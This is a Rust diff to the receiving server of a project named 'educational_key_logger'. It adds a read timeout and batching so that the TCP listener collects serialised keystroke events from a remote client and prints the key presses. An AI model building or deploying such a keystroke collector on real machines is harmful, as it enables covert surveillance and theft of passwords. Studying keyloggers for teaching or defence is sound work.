@@ -1,7 +1,10 @@
 use educational_key_logger::IP_PORT;
 use educational_key_logger::input::InputEvent;
-use std::io::Read;
+use std::io::{self, Read};
 use std::net::{TcpListener, TcpStream};
+use std::time::Duration;
+
+const TIMEOUT_DURATION: Duration = Duration::from_secs(2);
 
 fn main() {
     let listener = TcpListener::bind(IP_PORT).unwrap();
@@ -13,6 +16,10 @@ fn main() {
 fn handle_stream(mut stream: TcpStream) {
     let mut buffer = [0; 1024];
     let mut stream_read_handler = StreamReadHandler::new();
+    if let Err(e) = stream.set_read_timeout(Some(TIMEOUT_DURATION)) {
+        eprintln!("Failed to set read timeout: {}", e);
+        return;
+    }
     loop {
         match stream.read(&mut buffer) {
             Ok(0) => {
@@ -22,8 +29,13 @@ fn handle_stream(mut stream: TcpStream) {
             Ok(bytes_read) => {
                 stream_read_handler.read_buffer(&buffer[..bytes_read]);
             }
+            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
+                if !stream_read_handler.input_events.is_empty() {
+                    stream_read_handler.handle_input_events();
+                }
+            }
             Err(e) => {
-                println!("Read error: {}", e);
+                eprintln!("Read error: {}", e);
                 break;
             }
         }
@@ -34,6 +46,7 @@ struct StreamReadHandler {
     size_prefix: Option<u8>,
     /// Buffer for InputEvent. It's length can never exceed size_prefix which is sent through TCPStream.
     input_event_buffer: Vec<u8>,
+    input_events: Vec<InputEvent>,
 }
 
 impl StreamReadHandler {
@@ -41,6 +54,7 @@ impl StreamReadHandler {
         StreamReadHandler {
             size_prefix: None,
             input_event_buffer: vec![],
+            input_events: vec![],
         }
     }
     pub fn read_buffer(&mut self, buffer: &[u8]) {
@@ -79,14 +93,21 @@ impl StreamReadHandler {
         }
     }
     fn input_event_buffer_full(&mut self) {
-        let input_event: InputEvent = postcard::from_bytes(&self.input_event_buffer)
-            .expect("Handler ensures complete and correctly framed InputEvent");
+        self.input_events.push(
+            postcard::from_bytes(&self.input_event_buffer)
+                .expect("Handler ensures complete and correctly framed InputEvent"),
+        );
         self.input_event_buffer.clear();
         self.size_prefix = None;
-        handle_input_event(input_event);
     }
-}
 
-fn handle_input_event(input_event: InputEvent) {
-    dbg!(input_event);
+    fn handle_input_events(&mut self) {
+        let input_events = std::mem::take(&mut self.input_events);
+        input_events.iter().for_each(|input_event| {
+            if input_event.is_key_press() {
+                print!("{}", input_event.code_as_string());
+            }
+        });
+        println!();
+    }
 }
